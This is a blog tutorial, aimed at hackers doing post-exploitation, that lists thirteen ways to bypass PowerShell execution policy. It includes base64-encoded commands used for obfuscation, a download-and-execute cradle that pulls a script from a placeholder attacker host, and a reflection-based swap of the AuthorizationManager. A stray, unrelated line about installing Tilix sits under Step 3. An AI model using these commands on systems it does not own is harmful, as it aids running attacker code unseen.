---
layout: post
title:  "How to Bypass PowerShell Execution Policy"
date:   2020-09-24 20:24:26 -0700
categories: PowerShell Execution Policy
---

<h1><b>Intro</b></h1>

PowerShell is an essential component of any Windows environment and can be a powerful tool in the hands of a hacker. During post-exploitation, PowerShell scripts can make privilege escalation and pivoting a breeze, but its execution policy can put a damper on even the best-laid plans. There are a variety of methods, however, that can be used to bypass PowerShell execution policy.

<h1><b>PowerShell Execution Policy Overview</b></h1>
The purpose of PowerShell's execution policy is to control how configuration files are loaded and how scripts are run. It's a safety feature that helps prevent malicious scripts from being executed. Policies can be set at the computer level, user level, and session level on Windows machines. It's important to note that the execution policy is not meant to be secure — it merely prevents users from unintentionally causing damage. As we'll soon find out, it can be bypassed in several ways.

There are seven types of execution policies in PowerShell. These are only enforced on Windows machines:

Unrestricted: This is the default policy for non-Windows machines; it means scripts will be run with a warning.
Restricted: This is the default for Windows machines; it prevents scripts from being run but allows individual commands.
Bypass: This means all scripts can run and there are no warnings.
AllSigned: This requires all scripts and configuration files to be signed by a trusted publisher — even those created on the local machine.
RemoteSigned: This is the default policy on Windows servers; requires a signature only from files downloaded from the internet.
Default: This simply sets the default execution policy.
Undefined: This is when there is no policy set in the current scope. If all scopes are Undefined, the execution policy defaults to Restricted.

To view the current execution policy, issue the following command in PowerShell:


{% highlight ruby %}

Get-ExecutionPolicy

{% endhighlight %}

Now that we've covered the basics, let's get started on some bypasses.


<h1><b>Step 1: Bypass Flag </b></h1>
Perhaps the easiest way to bypass execution policy is to use the Bypass flag. Doing so will run the script with no warnings or prompts.

To do so, open PowerShell and type:

{% highlight ruby %}
PowerShell.exe -ExecutionPolicy Bypass -File .\script.ps1
{% endhighlight %}

<h1><b>Step 2: Unrestricted Flag</b></h1>
Similar to the Bypass flag, we can use the Unrestricted flag to run our script, this time with a warning.

{% highlight ruby %}
PowerShell.exe -ExecutionPolicy Unrestricted -File .\script.ps1
{% endhighlight %}

<h1><b>Step 3: Command Switch</b></h1>
We can use the command switch to issue commands and directly run a script. This will work for simple scripts, but more complex ones will usually have errors.
Tilix is available in Kali's APT repositories and can be installed using the below command.

{% highlight ruby %}

PowerShell -command "Write-Host 'This is a test.'"

{% endhighlight %}


<h1><b>Step 4: Encoded Command Switch</b></h1>
This method is similar to the command switch but encodes the script as a base64 encoded string. This can help avoid parsing errors as well as provide a layer of obfuscation.

{% highlight ruby %}
$command = "Write-Host 'This is a test.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
{% endhighlight %}

<h1><b>Step 5: Invoke-Command</b></h1>
The Invoke-Command method is nice in that it can be used to issue commands against remote machines when PowerShell remoting has been enabled.

{% highlight ruby %}
invoke-command -scriptblock {Write-Host "This is a test."}
{% endhighlight %}

<h1><b>Step 6: Invoke-Expression</b></h1>
We can use the Invoke-Expression method to pipe the contents of our script and be executed.

{% highlight ruby %}
Get-Content .\script.ps1 | Invoke-Expression
{% endhighlight %}

<h1><b>Step 7: Download from URL</b></h1>
PowerShell can be used to download a script from the internet, or from an attacker's machine, and then be executed without writing to disk.

{% highlight ruby %}

PowerShell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"

{% endhighlight %}

<h1><b>Step 8: Paste</b></h1>
Another method to get around execution policy is to simply copy and paste the script into the interactive console. Again, this is useful for running quick scripts that aren't too complex.

{% highlight ruby %}
Write-Host "This is a test."
{% endhighlight %}

<h1><b>Step 9: Echo & Pipe</b></h1>
We can also echo the contents of our script into PowerShell standard input.

{% highlight ruby %}
Echo Write-Host "This is a test." | PowerShell -noprofile -
{% endhighlight %}

<h1><b>Step 10: Read & Pipe</b></h1>
Similar to the echo method, we can read the contents of our script and pipe it into PowerShell standard input.

{% highlight ruby %}
Get-Content .\script.ps1 | PowerShell -noprofile -
{% endhighlight %}

<h1><b>Step 11: Process Scope</b></h1>
The execution policy can be applied at different levels, including the currently controlled process. We can change the execution policy for the current process.

{% highlight ruby %}
Set-ExecutionPolicy Bypass -Scope Process
{% endhighlight %}

<h1><b>Step 12: Current User Scope</b></h1>
This method is similar to the process scope but changes the execution policy for the current user. This works by modifying a registry key under the hood.

{% highlight ruby %}
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
{% endhighlight %}

<h1><b>Step 13: Authorization Manager Swap</b></h1>
The final method we'll cover essentially overrides a function in PowerShell. The AuthorizationManager function will be replaced with a null value when our function is called, setting the execution policy for the session to Unrestricted, and allowing our script to run.

{% highlight ruby %}
function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))} Disable-ExecutionPolicy .\script.ps1
{% endhighlight %}
